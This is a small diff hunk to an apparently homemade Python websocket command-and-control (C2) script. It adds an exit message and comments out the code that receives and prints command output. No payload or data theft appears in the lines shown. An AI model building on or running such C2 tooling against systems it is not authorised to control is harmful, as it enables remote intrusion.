@@ -40,11 +40,12 @@ async def hello(websocket, path):
     await websocket.send(output)
     # Listen for exit command from C2
     if cmd == "exit":
+        prRed("Exit command received, exitting...")
         exit()
     
-    prCyan("Output Received: ")
-    cmdrec = await websocket.recv()
-    print(cmdrec)
+    # prCyan("Output Received: ")
+    # cmdrec = await websocket.recv()
+    # prGreen(cmdrec)
 
     
 
